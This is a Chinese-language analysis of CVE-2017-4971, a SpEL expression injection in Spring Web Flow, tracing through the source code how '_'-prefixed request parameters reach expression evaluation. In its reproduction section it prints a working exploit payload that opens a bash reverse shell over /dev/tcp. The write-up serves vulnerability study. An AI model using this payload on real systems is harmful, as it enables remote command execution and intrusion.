# CVE-2017-4971

![image-20210218194441152](CVE-2017-4971分析.assets/image-20210218194441152.png)

在分析这个漏洞之前需要一些`Spring Webflow`的基础知识

[Spring Web Flow 2.0 入门](https://www.ibm.com/developerworks/cn/education/java/j-spring-webflow/index.html)

[java-Spring Webflow：在视图状态之间移动](http://www.cocoachina.com/articles/111129)

![image-20210218194733254](CVE-2017-4971分析.assets/image-20210218194733254.png)

## 环境搭建

![image-20210218202011507](CVE-2017-4971分析.assets/image-20210218202011507.png)

## 漏洞复现

![image-20210218201936295](CVE-2017-4971分析.assets/image-20210218201936295.png)

**exp:**`url编码`

```
_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/ip/port 0>&1")).start()=vulhub
```

## 分析原理

[官方修复地址](https://github.com/spring-projects/spring-webflow/commit/ec3d54d2305e6b6bce12f770fec67fe63008d45b)

![image-20210218202450134](CVE-2017-4971分析.assets/image-20210218202450134.png)

可以看到是一个`AbstractMvcView.java  `类的`addEmptyValueMapping`方法里面进行了修改。我们就下载源代码进行分析。

[源代码下载](https://github.com/spring-projects/spring-webflow)

![image-20210218203221151](CVE-2017-4971分析.assets/image-20210218203221151.png)

这里就是`Expression target = emptyValueExpressionParser.parseExpression(field, parserContext);`

这一句的问题，是表达式的执行。 `SpEL注入执行`

而我们现在看看这个执行，接收的第一次参数是`field`，而这个`field`是`addEmptyValueMapping`函数来的，说明肯定是调用这个函数的时候出问题了。

我们回跟这个函数。

![image-20210218203901093](CVE-2017-4971分析.assets/image-20210218203901093.png)

看到这里有俩个地方都调用了这个函数，我们一个一个的分析，先分析`addModelBindings()`方法

![image-20210218203953533](CVE-2017-4971分析.assets/image-20210218203953533.png)

回跟`addModelBindings()`方法的上一层方法。

![image-20210218204058653](CVE-2017-4971分析.assets/image-20210218204058653.png)

而这里的`bind()`方法里面的`if`条件就包含了我们刚刚说到的调用`addEmptyValueMapping()`方法。然后我们详细的看看这个`bind()`方法

可以看到`addModelBindings`和`addDefaultMappings`方法都使用了`requestParameters`，而`requestParameters`就是获得的全部请求参数

![image-20210218204423476](CVE-2017-4971分析.assets/image-20210218204423476.png)

将我们的`requestParameters`做一些处理然后传递到`addModelBindings`和`addDefaultMappings`方法中，我们先看看`addModelBindings`方法。

![image-20210218204746269](CVE-2017-4971分析.assets/image-20210218204746269.png)

获得全部的`binding`的`Property`

![image-20210218205407984](CVE-2017-4971分析.assets/image-20210218205407984.png)

所以上面代码的意思：如果请求参数的key里面没有配置文件的`Property`，就会进入`else`

![image-20210218205644634](CVE-2017-4971分析.assets/image-20210218205644634.png)

而`fieldMarkerPrefix`是等于`_`,这也是我们exp里面是安`_`开头

![image-20210218205752547](CVE-2017-4971分析.assets/image-20210218205752547.png)

然后就调用`addEmptyValueMapping`函数，执行了命令

![image-20210218210007792](CVE-2017-4971分析.assets/image-20210218210007792.png)

我们在看看另一个函数在调用`addEmptyValueMapping`

![image-20210218210058692](CVE-2017-4971分析.assets/image-20210218210058692.png)

这里是将我们的请求参数去掉`_`，然后将值给`field`。而进入`addEmptyValueMapping(mapper, field, model);`要求是`!parameterNames.contains(field)`
。而这个是显然的，因为我们请求的`parameterNames`里面有`_`而，`field`是没有`_`的。所以肯定为真。

![image-20210218210510086](CVE-2017-4971分析.assets/image-20210218210510086.png)

然后就进入`addEmptyValueMapping(mapper, field, model);`

![image-20210218210826600](CVE-2017-4971分析.assets/image-20210218210826600.png)

所以就成功执行了命令。

**注意上面分析的代码是修复之后的代码。是`Expression target = emptyValueExpressionParser.parseExpression(field, parserContext);`
这个地方进行了修改。漏洞代码是`expressParser.parseExpression(field, parserContext);`**

## 参考

> https://www.anquanke.com/post/id/86244
>
>https://github.com/spring-projects/spring-webflow/commit/ec3d54d2305e6b6bce12f770fec67fe63008d45b#diff-301f5eca16aa30c1c9c789bdc5452ca9b5719fc1ec194739bd255f4b3cb1b6fa
>
>https://github.com/vulhub/vulhub/tree/master/spring/CVE-2017-4971